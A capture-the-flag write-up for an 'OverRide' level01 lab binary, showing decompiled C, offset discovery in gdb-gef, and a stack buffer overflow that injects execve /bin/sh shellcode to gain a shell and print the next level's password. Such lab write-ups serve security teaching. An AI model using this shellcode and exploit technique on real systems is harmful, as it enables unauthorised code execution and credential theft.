# Solution

Program used (IDA, gdb-gef)

Here is the decompiled C binary:

```c
char username[100];

int verify_user_name(void)
{
    puts("verifying username....\n");
    return (memcmp(username, "dat_wil", 7) != 0);
}

int verify_user_pass(char *str)
{
    return (memcmp(str, "admin", 5) != 0);
}

int main(void)
{
    int     result; 
    char    passwd[64];

    memset(passwd, 0, sizeof(passwd));
    puts("********* ADMIN LOGIN PROMPT *********");
    printf("Enter Username: ");
    fgets(username, 256, stdin);
    result = verify_user_name();
    if (result)
    {
        puts("nope, incorrect username...\n");
    }
    else
    {
        puts("Enter Password: ");
        fgets(passwd, 100, stdin);
        result = verify_user_pass(passwd);
        puts("nope, incorrect password...\n");
    }
    return (1);
}
```

Here we have multiple overflow `username` buffer but this one is inside the .bss section,
so we will not use this one, the `passwd` buffer is the good one since from this one we can overwrite the return address.

So the exploit is buffer overflow but first we need to pass the `username` buffer and then provide enough data to overflow the buffer,
and overwrite the return address that will point to a shellcode so we can run a shell.

First we need to find the offset of the buffer overflow that will allow us to overwrite the return address,
we will use a de brujin string that will allow us to find this information.

```sh
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
[+] Saved as '$_gef0'
gef➤  x/xw $esp
0xffffcb50:     0x61616176
gef➤  pattern search 0x61616176
[+] Searching for '76616161'/'61616176' with period=4
[+] Found at offset 84 (little-endian search) likely
```

So it found the offset 84 so the padding to overwrite the  address will be 80 byte + 4 byte of address.

Now we need to find an address where will we return to a nop sled and that will lead to our shellcode, 
here is the [shellcode](https://shell-storm.org/shellcode/files/shellcode-811.html) that we will use.

So we will use the buffer `username` address so our first input would look like this

```sh
python -c 'print "dat_will" + "\x90"*16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'
```

So `dat_will` we saw that the comparaison is on `dat_wil` the extra `l` is for the padding so that it's divisible by 8,
after that we add extra 16 byte of nop sled and then finally the shellcode.


The second input for the `password` buffer, need to received the padding of 80 byte and then the address of 16 byte nop sled,
so it will look like this the return address is packed to 32 bit in little endian:

```sh
python -c 'print "A"*80 + "P\xa0\x04\x08"'
```

Now we need to input both at the same time and need to have a control of stdin at the same time to make it work here is the result:
```sh
level01@OverRide:~$ (python -c 'print "dat_will" + "\x90"*16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A"*80 + "P\xa0\x04\x08"'; cat) | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

We have a shell and the flag.
